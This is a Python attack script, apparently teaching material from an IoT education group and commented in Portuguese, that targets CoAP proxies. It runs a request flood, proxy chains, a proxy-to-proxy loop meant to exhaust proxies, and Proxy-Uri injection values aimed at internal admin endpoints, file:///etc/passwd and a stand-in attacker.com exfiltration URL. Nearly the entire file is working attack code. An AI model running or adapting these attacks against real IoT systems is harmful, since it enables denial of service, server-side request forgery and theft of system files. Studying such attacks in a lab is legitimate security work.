#!/usr/bin/env python3
"""
CoAP Proxy Chain Amplification Attack
Abusa de proxies para amplificação e loops
Para fins educacionais - GT-IoTEdu
"""

import asyncio
import sys
import time
from aiocoap import *

attack_stats = {
    'proxy_requests': 0,
    'chains_created': 0,
    'loops_initiated': 0,
    'amplification_factor': 0
}

class ProxyAmplificationAttacker:
    def __init__(self, proxy1_host, proxy1_port, proxy2_endpoint=None):
        self.proxy1 = f"coap://{proxy1_host}:{proxy1_port}"
        self.proxy2 = proxy2_endpoint  # "host:port"
    
    async def simple_proxy_request(self, proxy_uri_target):
        """Request simples via proxy"""
        
        try:
            protocol = await Context.create_client_context()
            
            request = Message(code=GET)
            request.set_request_uri(self.proxy1)
            request.opt.proxy_uri = proxy_uri_target
            
            print(f"[→] Proxy request: {self.proxy1} → {proxy_uri_target}")
            
            response = await protocol.request(request).response
            
            attack_stats['proxy_requests'] += 1
            
            print(f"[✓] Response: {response.code}")
            
        except Exception as e:
            print(f"[✗] Erro: {e}")
    
    async def proxy_chain_attack(self, final_target, chain_length=5):
        """Cria cadeia de proxies"""
        
        if not self.proxy2:
            print("[!] Proxy 2 não configurado - chain attack desabilitado")
            return
        
        print(f"\n[*] Criando proxy chain de comprimento {chain_length}...\n")
        
        # Simula chain: Attacker → P1 → P2 → Target
        
        proxy1_uri = self.proxy1
        proxy2_uri = f"coap://{self.proxy2}"
        
        try:
            protocol = await Context.create_client_context()
            
            # Request para Proxy1, que deve encaminhar para Proxy2
            request = Message(code=GET)
            request.set_request_uri(proxy1_uri)
            
            # Proxy1 → Proxy2 → Target
            nested_uri = f"{proxy2_uri}/{final_target}"
            request.opt.proxy_uri = nested_uri
            
            print(f"[!] Chain: Attacker → {proxy1_uri} → {proxy2_uri} → {final_target}")
            
            response = await protocol.request(request).response
            
            attack_stats['chains_created'] += 1
            
            print(f"[✓] Chain response: {response.code}")
            
        except Exception as e:
            print(f"[✗] Chain erro: {e}")
    
    async def proxy_loop_attack(self):
        """Cria loop infinito entre proxies"""
        
        if not self.proxy2:
            print("[!] Proxy 2 necessário para loop attack")
            return
        
        print("\n[*] Iniciando Proxy Loop Attack...\n")
        
        proxy1_uri = self.proxy1
        proxy2_uri = f"coap://{self.proxy2}"
        
        # Loop: P1 → P2 (com Proxy-Uri=P1)
        # P2 recebe e tenta proxy para P1
        # P1 recebe e tenta proxy para P2
        # LOOP INFINITO!
        
        try:
            protocol = await Context.create_client_context()
            
            request = Message(code=GET)
            request.set_request_uri(proxy1_uri)
            
            # Proxy-Uri aponta de volta para outro proxy
            request.opt.proxy_uri = f"{proxy2_uri}?proxy-loop"
            
            print(f"[!] LOOP iniciado: {proxy1_uri} ⟲ {proxy2_uri}")
            print("[!] Proxies entrarão em loop infinito até timeout!")
            
            # Timeout longo - loop pode travar proxies
            response = await asyncio.wait_for(
                protocol.request(request).response,
                timeout=10.0
            )
            
            attack_stats['loops_initiated'] += 1
            
        except asyncio.TimeoutError:
            print("[✓] Timeout (esperado em loop) - proxies provavelmente em loop")
            attack_stats['loops_initiated'] += 1
        except Exception as e:
            print(f"[!] Loop erro: {e}")
    
    async def proxy_amplification_flood(self, target, num_requests=100):
        """Flood via proxy para amplificação"""
        
        print(f"\n[*] Proxy Amplification Flood: {num_requests} requests...\n")
        
        tasks = []
        for i in range(num_requests):
            task = self.simple_proxy_request(f"{target}/resource{i % 10}")
            tasks.append(task)
            
            if len(tasks) >= 20:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                await asyncio.sleep(0.5)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        # Cada proxy request pode gerar múltiplos requests internos
        attack_stats['amplification_factor'] = attack_stats['proxy_requests'] * 1.5  # Estimado
    
    async def proxy_uri_injection(self):
        """Testa injection em Proxy-Uri"""
        
        print("\n[*] Proxy-Uri Injection Test...\n")
        
        malicious_uris = [
            "coap://internal-server:5683/admin",
            "coap://localhost:5683/debug",
            "coap://127.0.0.1:5683/config",
            "file:///etc/passwd",  # Injection test
            "http://attacker.com/exfiltrate",
        ]
        
        for mal_uri in malicious_uris:
            try:
                protocol = await Context.create_client_context()
                
                request = Message(code=GET)
                request.set_request_uri(self.proxy1)
                request.opt.proxy_uri = mal_uri
                
                print(f"[!] Injection test: {mal_uri}")
                
                response = await asyncio.wait_for(
                    protocol.request(request).response,
                    timeout=3.0
                )
                
                print(f"[!] Response: {response.code} (injection pode ter funcionado!)")
                
            except asyncio.TimeoutError:
                print(f"[✗] Timeout para {mal_uri}")
            except Exception as e:
                print(f"[✗] Erro: {type(e).__name__}")
            
            await asyncio.sleep(0.5)
    
    async def launch_attack(self):
        """Lança ataque completo"""
        
        print("\n[*] Iniciando CoAP Proxy Chain Amplification Attack...\n")
        
        # Fase 1: Simple proxy requests
        print("=" * 70)
        print("FASE 1: Simple Proxy Requests")
        print("=" * 70)
        await self.proxy_amplification_flood("coap://example.com", 50)
        
        await asyncio.sleep(2)
        
        # Fase 2: Proxy chains
        if self.proxy2:
            print("\n" + "=" * 70)
            print("FASE 2: Proxy Chain Attack")
            print("=" * 70)
            await self.proxy_chain_attack("sensor/temperature", 3)
            
            await asyncio.sleep(2)
            
            # Fase 3: Proxy loops
            print("\n" + "=" * 70)
            print("FASE 3: Proxy Loop Attack")
            print("=" * 70)
            await self.proxy_loop_attack()
            
            await asyncio.sleep(2)
        
        # Fase 4: URI Injection
        print("\n" + "=" * 70)
        print("FASE 4: Proxy-Uri Injection")
        print("=" * 70)
        await self.proxy_uri_injection()
        
        # Relatório
        print("\n" + "=" * 70)
        print("[✓] CoAP Proxy Amplification Attack Completado!")
        print("=" * 70)
        print(f"[✓] Proxy requests: {attack_stats['proxy_requests']}")
        print(f"[✓] Chains criados: {attack_stats['chains_created']}")
        print(f"[✓] Loops iniciados: {attack_stats['loops_initiated']}")
        print(f"[✓] Fator de amplificação estimado: {attack_stats['amplification_factor']:.1f}x")
        print("=" * 70)

async def main():
    if len(sys.argv) < 3:
        print("Uso: python3 attack.py <proxy1_ip> <proxy1_port> [proxy2_ip:port]")
        print("\nExemplos:")
        print("  python3 attack.py 172.17.0.2 5683")
        print("  python3 attack.py 172.17.0.2 5683 172.17.0.3:5683")
        sys.exit(1)
    
    proxy1_host = sys.argv[1]
    proxy1_port = int(sys.argv[2])
    proxy2_endpoint = sys.argv[3] if len(sys.argv) > 3 else None
    
    print("=" * 70)
    print("  CoAP PROXY AMPLIFICATION - Educational Purpose Only")
    print("  GT-IoTEdu - Grupo de Trabalho IoT Educacional")
    print("=" * 70)
    print(f"[*] Proxy 1: {proxy1_host}:{proxy1_port}")
    if proxy2_endpoint:
        print(f"[*] Proxy 2: {proxy2_endpoint}")
    print(f"[*] Técnica: Proxy Chain & Loop Amplification")
    print(f"[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    attacker = ProxyAmplificationAttacker(proxy1_host, proxy1_port, proxy2_endpoint)
    await attacker.launch_attack()

if __name__ == "__main__":
    asyncio.run(main())